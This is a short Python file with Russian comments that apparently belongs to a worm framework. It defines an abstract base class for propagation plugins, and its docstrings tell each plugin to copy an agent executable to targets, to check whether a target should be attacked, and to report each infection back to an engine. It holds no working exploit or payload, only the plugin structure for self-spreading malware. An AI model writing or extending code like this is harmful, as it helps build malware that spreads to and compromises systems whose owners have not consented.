# Интерфейсы для модулей распространения (Worm)

from abc import ABC, abstractmethod
from typing import TYPE_CHECKING

# Предотвращаем циклическую зависимость при проверке типов
if TYPE_CHECKING:
    from .propagation_engine import PropagationEngine

class PropagationPluginBase(ABC):
    """Базовый класс для плагинов распространения."""

    def __init__(self, config: dict):
        self.config = config

    @abstractmethod
    def get_name(self) -> str:
        """Возвращает уникальное имя (ID) плагина."""
        pass

    @abstractmethod
    def is_supported(self) -> bool:
        """Проверяет, поддерживается ли плагин на текущей системе (ОС, зависимости)."""
        pass

    @abstractmethod
    def run(self, engine: 'PropagationEngine'):
        """Запускает логику сканирования и распространения плагина.

        Плагин должен использовать engine.agent_executable_path для получения пути
        к файлу агента и вызывать engine.report_infection(target_id) при успехе.
        Плагин должен проверять engine.should_attack(target_id) перед атакой.
        """
        pass 